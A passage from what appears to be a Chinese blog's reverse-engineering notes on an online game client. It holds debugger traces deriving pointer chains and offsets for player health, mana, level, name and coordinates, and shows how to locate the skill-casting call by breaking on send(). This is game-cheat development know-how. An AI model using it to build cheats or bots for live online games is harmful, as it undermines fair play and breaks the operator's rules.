class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B2CC25 - 89 86 8C070000        - mov [esi+0000078C],eax</span><br><span class=\"line\">eax = 00000212</span><br><span class=\"line\">esi = 15E71F60   5B14C038</span><br><span class=\"line\">当前血量 = [esi + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B2CB07 - 8B F1                 - mov esi,ecx</span><br><span class=\"line\">ECX = 514FA270</span><br><span class=\"line\">当前血量 = [ECX + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B37131 - 56                    - push esi</span><br><span class=\"line\">00B37132 - E8 C959FFFF           - call 00B2CB00</span><br><span class=\"line\">00B37137 - B0 01                 - mov al,01 &#123; 1 &#125;</span><br><span class=\"line\">ecx = 514FA270</span><br><span class=\"line\"></span><br><span class=\"line\">00BEF846 - 8B 10                 - mov edx,[eax]</span><br><span class=\"line\">00BEF848 - FF 52 68              - call dword ptr [edx+68]</span><br><span class=\"line\">00BEF84B - B0 01                 - mov al,01 &#123; 1 &#125;</span><br><span class=\"line\">ecx = 514FA270</span><br><span class=\"line\"></span><br><span class=\"line\">00BEF844 - 8B C8                 - mov ecx,eax</span><br><span class=\"line\">eax = 514FA270</span><br><span class=\"line\">当前血量 = [EAX + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BED9C0 - 8B 41 08              - mov eax,[ecx+08]</span><br><span class=\"line\">eax = 265489C0 ecx = 063A9708</span><br><span class=\"line\">00BED9C3 - 8B 40 30              - mov eax,[eax+30]</span><br><span class=\"line\">00BED9C6 - C3                    - ret </span><br><span class=\"line\">eax = 514FA270</span><br><span class=\"line\">当前血量 = [[[ecx+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BEFDBB  | E8 00DCFFFF          | call elementclient.BED9C0                 |</span><br><span class=\"line\"></span><br><span class=\"line\">00BEFDB9  | 8BCB                 | mov ecx,ebx                               |</span><br><span class=\"line\">当前血量 = [[[ebx+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BEFBCB  | 8BD9                 | mov ebx,ecx                               |</span><br><span class=\"line\">当前血量 = [[[ecx+08]+30] + 78C]</span><br><span class=\"line\">BCB F51</span><br><span class=\"line\"></span><br><span class=\"line\">009BBED5  | FFD0                 | call eax                                  |</span><br><span class=\"line\"></span><br><span class=\"line\">009BBECB  | 8B0F                 | mov ecx,dword ptr ds:[edi]                |</span><br><span class=\"line\">当前血量 = [[[[edi]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEC1  | 83C7 1C              | add edi,1C                                |</span><br><span class=\"line\">当前血量 = [[[[edi+1c]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEB9  | 8B78 1C              | mov edi,dword ptr ds:[eax+1C]             |</span><br><span class=\"line\">当前血量 = [[[[[eax+1C]+1c]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEAE  | 8B40 1C              | mov eax,dword ptr ds:[eax+1C]             | eax:&quot;ff&amp;?&quot;</span><br><span class=\"line\">当前血量 = [[[[[[eax+1C]+1C]+1c]+08]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">009BBEA4  | A1 A8DD4F01          | mov eax,dword ptr ds:[14FDDA8]            |</span><br><span class=\"line\">当前血量 = [[[[[[[14FDDA8]+1C]+1C]+1C]+08]+30] + 78C]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B2E1C5 - 89 86 8C070000        - mov [esi+0000078C],eax</span><br><span class=\"line\">esi = 4098A518</span><br><span class=\"line\">当前血量 = [esi + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B2E0A7  | 8BF1                    | mov esi,ecx                          |</span><br><span class=\"line\">当前血量 = [ecx + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00B38612  | E8 895AFFFF             | call elementclient.B2E0A0            |</span><br><span class=\"line\">ecx = 4098A518</span><br><span class=\"line\"></span><br><span class=\"line\">00BF0808  | FF52 68                 | call dword ptr ds:[edx+68]           | </span><br><span class=\"line\"></span><br><span class=\"line\">00BF0804  | 8BC8                    | mov ecx,eax                          |</span><br><span class=\"line\">eax = 4098A518</span><br><span class=\"line\">当前血量 = [eax + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BEE980  | 8B41 08                 | mov eax,dword ptr ds:[ecx+8]         |</span><br><span class=\"line\">00BEE983  | 8B40 30                 | mov eax,dword ptr ds:[eax+30]        |</span><br><span class=\"line\">00BEE986  | C3                      | ret                                  |</span><br><span class=\"line\">当前血量 = [[[ecx+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3ED9  | FF50 34                 | call dword ptr ds:[eax+34]           |</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3ECB  | 8B4C88 1C               | mov ecx,dword ptr ds:[eax+ecx*4+1C]  |</span><br><span class=\"line\">当前血量 = [[[[eax+ecx*4+1C]+8]+30] + 78C]</span><br><span class=\"line\">eax = 08D8EF00</span><br><span class=\"line\">ecx = 00000001</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3EC1  | 8B46 04                 | mov eax,dword ptr ds:[esi+4]         |</span><br><span class=\"line\">00BE3EC4  | 8B40 1C                 | mov eax,dword ptr ds:[eax+1C]        |</span><br><span class=\"line\">当前血量 = [[[[[[esi+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00BE3E98  | 8BF1                    | mov esi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[ecx+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A55E  | E8 0D991900             | call elementclient.BE3E70            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A553  | 8B8F 98000000           | mov ecx,dword ptr ds:[edi+98]        |</span><br><span class=\"line\">当前血量 = [[[[[[[edi+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A4E4  | 8BF9                    | mov edi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[[ecx+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A1BF  | E8 1C030000             | call elementclient.A4A4E0            |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00A4A1B9  | 8BCE                    | mov ecx,esi                          |</span><br><span class=\"line\">当前血量 = [[[[[[[esi+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A4A0B8  | 8BF1                    | mov esi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[[ecx+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F231  | E8 7AAE0000             | call elementclient.A4A0B0            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F22E  | 8B4F 1C                 | mov ecx,dword ptr ds:[edi+1C]        |</span><br><span class=\"line\">当前血量 = [[[[[[[[edi+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3EF57  | 8BF9                    | mov edi,ecx                          | </span><br><span class=\"line\">当前血量 = [[[[[[[[ecx+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F840  | E8 0BF7FFFF             | call elementclient.A3EF50            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F83E  | 8BCF                    | mov ecx,edi                          |</span><br><span class=\"line\">当前血量 = [[[[[[[[edi+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00A3F7A5  | 8BF9                    | mov edi,ecx                          |</span><br><span class=\"line\">当前血量 = [[[[[[[[ecx+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">00D35072  | E8 29A7D0FF             | call elementclient.A3F7A0            |</span><br><span class=\"line\"></span><br><span class=\"line\">00D3506D  | B9 F8845001             | mov ecx,elementclient.15084F8        |</span><br><span class=\"line\">当前血量 = [[[[[[[[0x15084F8+1C]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"> [[[[[[[[0x1508514]+98]+4]+1C]+1*4+1C]+8]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$ + 78C 为血量</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E4 为血量上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 790 为真气</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E8 为真气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 784 为等级</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 794 为经验</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 798 为元神</span><br><span class=\"line\"></span><br><span class=\"line\">??? $ + 79C 为元气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + B00 / $ + B04 为角色姓名</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 930 为银币</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"../../../AppData/Roaming/Typora/typora-user-images/image-20221222191354658.png\" alt=\"image-20221222191354658\"></p>\n<p>如图可知，this 指针的基地址为 5F7FB0D8</p>\n<p>$ + 78C 为血量</p>\n<p>$ + 7E4 为血量上限</p>\n<p>$ + 790 为真气</p>\n<p>$ + 7E8 为真气上限</p>\n<p>$ + 784 为等级</p>\n<p>$ + 794 为经验</p>\n<p>$ + 798 为元神</p>\n<p>$ + 79C 为元气上限</p>\n<p>34416B58</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">773       77+400=477   +3C  x</span><br><span class=\"line\">177       17           +40  z</span><br><span class=\"line\">-349      -34+550=516  +44  y</span><br></pre></td></tr></table></figure>\n<p>搜索角色名称</p>\n<p>方法 1</p>\n<p>1.ce 搜索角色名称，注意，宽字节和窄字节都要考虑</p>\n<p>2. 使用定位基地址的方式，一个一个关键点网上找</p>\n<p>方法 2（在已知任务角色信息基地址的前提下）</p>\n<p>在 ce 里面搜索</p>\n<p>逐个分析这些地址，找出与任务角色基地址信息相近的地址，然后计算偏移</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221227170809963.png\" alt=\"image-20221227170809963\"></p>\n<p>34417B58-34416B58=B00</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221227170851601.png\" alt=\"image-20221227170851601\"></p>\n<p>释放技能 call 查找</p>\n<p>思路一：技能应该有技能 ID，索引，技能文字信息和描述</p>\n<p>可以从技能文字信息为入口，用 CE 搜索字符信息，可以根据内存读写断点。定位技能的关键 call</p>\n<p>思路二：分析游戏按键和鼠标点击处理机制，找到技能 call</p>\n<p>思路三：针对网游，一般网络游戏会将攻击和伤害的计算放在服务器端处理</p>\n<p>失望技能需要与服务端进行网络通信，通过游戏数据网络数据收发机制，跟踪 send，recv 函数，用条件过滤，保证 send 的是释放技能的数据，看函数堆栈反推上层函数，找到技能 call</p>\n<p>bp send, 对网络发送数据的函数下断点</p>\n<p>排除其他数据包发送的干扰，定位到使用技能时触发的数据包的发送</p>\n<p>ctrl + F9 定位到游戏程序模块 (OD 上 module 为游戏进程名) 然后逐层分析函数，看谁更适合作为技能 call</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UserSkill ()</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\txxx()</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tsend() </span><br><span class=\"line\">\t\t//send处下断点，根据堆栈回溯可以定位技能call</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CC3F37  | 57                      | push edi                              |</span><br><span class=\"line\">00CC3F38  | 56                      | push esi                              | esi:L&quot;)q&quot;</span><br><span class=\"line\">00CC3F39  | 8B49 20                 | mov ecx,dword ptr ds:[ecx+20]         |</span><br><span class=\"line\">00CC3F3C  | E8 0F780B00             | call elementclient.D7B750             |</span><br></pre></td></tr></table></figure>\n<p>发送消息或者触发事件 SendNotyxxx</p>\n<p>消息事件处理线程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while(1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tswitch</span><br><span class=\"line\">\t\tcase xxx;</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t\tcase yyy;</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">764B58A0  | 8BFF                   | mov edi,edi                           |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7AD35  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00D7AD37  | 6A 01                  | push 1                                |</span><br><span class=\"line\">00D7AD39  | 68 31AC2F01            | push elementclient.12FAC31            |</span><br><span class=\"line\">00D7AD3E  | FF35 7CAD5001          | push dword ptr ds:[150AD7C]           |</span><br><span class=\"line\">00D7AD44  | FF15 486A1E01          | call dword ptr ds:[&lt;&amp;send&gt;]           |</span><br><span class=\"line\"></span><br><span class=\"line\">00D7AC71  |.  FF75 10       push [arg.3]</span><br><span class=\"line\">00D7AC74  |.  FF75 0C       push [arg.2]</span><br><span class=\"line\">00D7AC77  |.  E8 24000000   call ElementC.00D7ACA0</span><br><span class=\"line\"></span><br><span class=\"line\">00D7B9CC  |&gt; \\FF75 0C       push [arg.2]</span><br><span class=\"line\">00D7B9CF  |.  8B8E AC000000 mov ecx,dword ptr ds:[esi+0xAC]</span><br><span class=\"line\">00D7B9D5  |.  57            push edi</span><br><span class=\"line\">00D7B9D6  |.  FFB6 B0000000 push dword ptr ds:[esi+0xB0]</span><br><span class=\"line\">00D7B9DC  |.  E8 0FF2FFFF   call ElementC.00D7ABF0</span><br><span class=\"line\"></span><br><span class=\"line\">00D7B7D1  |.  66:8906       mov word ptr ds:[esi],ax</span><br><span class=\"line\">00D7B7D4  |&gt;  6A 00         push 0x0</span><br><span class=\"line\">00D7B7D6  |.  8D45 DC       lea eax,[local.9]</span><br><span class=\"line\">00D7B7D9  |.  8BCF          mov ecx,edi</span><br><span class=\"line\">00D7B7DB  |.  50            push eax</span><br><span class=\"line\">00D7B7DC  |.  E8 9F000000   call ElementC.00D7B880</span><br><span class=\"line\">//以上三个除了技能也能中断</span><br><span class=\"line\"></span><br><span class=\"line\">00CC3F31  |&gt; \\8B0D 38EE4F01 mov ecx,dword ptr ds:[0x14FEE38]         ;  ElementC.015084F8     </span><br><span class=\"line\">00CC3F37  |.  57            push edi                                    0C</span><br><span class=\"line\">00CC3F38  |.  56            push esi                                    04229034  </span><br><span class=\"line\">00CC3F39  |.  8B49 20       mov ecx,dword ptr ds:[ecx+0x20]  \t\t\t24BC4028</span><br><span class=\"line\">00CC3F3C  |.  E8 0F780B00   call ElementC.00D7B750</span><br><span class=\"line\">//没有技能ID</span><br><span class=\"line\"></span><br><span class=\"line\">009AC4F5  |.  FF75 14       push [arg.4]\t\t\t\t\t\t\t\t0019EE7C</span><br><span class=\"line\">009AC4F8  |.  C701 00000000 mov dword ptr ds:[ecx],0x0\t\t\t\t\t[24A1B180]</span><br><span class=\"line\">009AC4FE  |.  FF75 10       push [arg.3]\t\t\t\t\t\t\t\t01</span><br><span class=\"line\">009AC501  |.  FF75 0C       push [arg.2]\t\t\t\t\t\t\t\t215AAB00</span><br><span class=\"line\">009AC504  |.  FF75 08       push [arg.1]\t\t\t\t\t\t\t\t7D</span><br><span class=\"line\">009AC507  |.  E8 D4793100   call ElementC.00CC3EE0</span><br><span class=\"line\">//技能不可用</span><br><span class=\"line\"></span><br><span class=\"line\">00B42E62   .  50            push eax\t\t\t0019EE7C</span><br><span class=\"line\">00B42E63   .  8B87 00280000 mov eax,dword ptr ds:[edi+0x2800]    4E492C40</span><br><span class=\"line\">00B42E69   .  6A 01         push 0x1</span><br><span class=\"line\">00B42E6B   .  FF75 C8       push dword ptr ss:[ebp-0x38]      215AAB00</span><br><span class=\"line\">00B42E6E   .  FF70 08       push dword ptr ds:[eax+0x8]     7D        44EE61B8 + 08</span><br><span class=\"line\">00B42E71   .  A1 38EE4F01   mov eax,dword ptr ds:[0x14FEE38]   015084F8</span><br><span class=\"line\">00B42E76   .  8B48 20       mov ecx,dword ptr ds:[eax+0x20]   24B53028</span><br><span class=\"line\">00B42E79   .  81C1 EC000000 add ecx,0xEC</span><br><span class=\"line\">00B42E7F   .  E8 3C96E6FF   call ElementC.009AC4C0</span><br><span class=\"line\">//技能不可用</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00B69E06  |.  6A 00         push 0x0\t\t\t0</span><br><span class=\"line\">00B69E08  |.  50            push eax          0</span><br><span class=\"line\">00B69E09  |.  FF76 08       push dword ptr ds:[esi+0x8]    80001A0B  80001C4D</span><br><span class=\"line\">00B69E0C  |.  E8 5F87FDFF   call ElementC.00B42570</span><br><span class=\"line\">//无技能ID</span><br><span class=\"line\">//以下执行频率很高，消息或者类似事件派发的一个地方</span><br><span class=\"line\"></span><br><span class=\"line\">00B697CF  |&gt; \\8B40 0C       mov eax,dword ptr ds:[eax+0xC]</span><br><span class=\"line\">00B697D2  |.  FFD0          call eax</span><br><span class=\"line\"></span><br><span class=\"line\">00B6A4CF   .  8BCE          mov ecx,esi</span><br><span class=\"line\">00B6A4D1   .  E8 9AF2FFFF   call ElementC.00B69770</span><br><span class=\"line\"></span><br><span class=\"line\">00B5F6E4  |.  8B03          |mov eax,dword ptr ds:[ebx]</span><br><span class=\"line\">00B5F6E6  |.  8BCB          |mov ecx,ebx</span><br><span class=\"line\">00B5F6E8  |.  FF75 08       |push [arg.1]</span><br><span class=\"line\">00B5F6EB  |.  FF50 04       |call dword ptr ds:[eax+0x4]</span><br><span class=\"line\"></span><br><span class=\"line\">00B55D68  |.  53            push ebx</span><br><span class=\"line\">00B55D69  |.  E8 12990000   call ElementC.00B5F680</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE9231 - FF 71 08  - push [ecx+08]</span><br><span class=\"line\">00CE92C7 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00CE92DE - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B3E488 - FF 73 08  - push [ebx+08]</span><br><span class=\"line\">00B3E62E - FF 73 08  - push [ebx+08]</span><br><span class=\"line\">00B41F83 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B425F8 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B42E6E - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B356C7 - FF 70 08  - push [eax+08]</span><br><span class=\"line\">00B356DB - 8B 78 08  - mov edi,[eax+08]</span><br><span class=\"line\">00B5E550 - FF 70 08  - push [eax+08]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE922A  | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]        | 015084F8</span><br><span class=\"line\">00CE922F  | 56                     | push esi                              | 06CBDD48</span><br><span class=\"line\">00CE9230  | 57                     | push edi                              | 52B640C8</span><br><span class=\"line\">00CE9231  | FF71 08                | push dword ptr ds:[ecx+8]             | 0000007D</span><br><span class=\"line\">00CE9234  | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]         | 1D27F9C0</span><br><span class=\"line\">00CE9237  | 8B70 30                | mov esi,dword ptr ds:[eax+30]         | 36FAC5B8</span><br><span class=\"line\">00CE923A  | FF15 E8601E01          | call dword ptr ds:[&lt;&amp;?IsGoblinSkill@E | 034CFD30</span><br><span class=\"line\">00CE9240  | 83C4 04                | add esp,4                             |</span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\">00CE92C1  | 6A FF                  | push FFFFFFFF                         | FFFFFFFF</span><br><span class=\"line\">00CE92C3  | 6A 00                  | push 0                                | 0</span><br><span class=\"line\">00CE92C5  | 6A 00                  | push 0                                | 0</span><br><span class=\"line\">00CE92C7  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00CE92CA  | 8B42 0C                | mov eax,dword ptr ds:[edx+C]          | 00969460</span><br><span 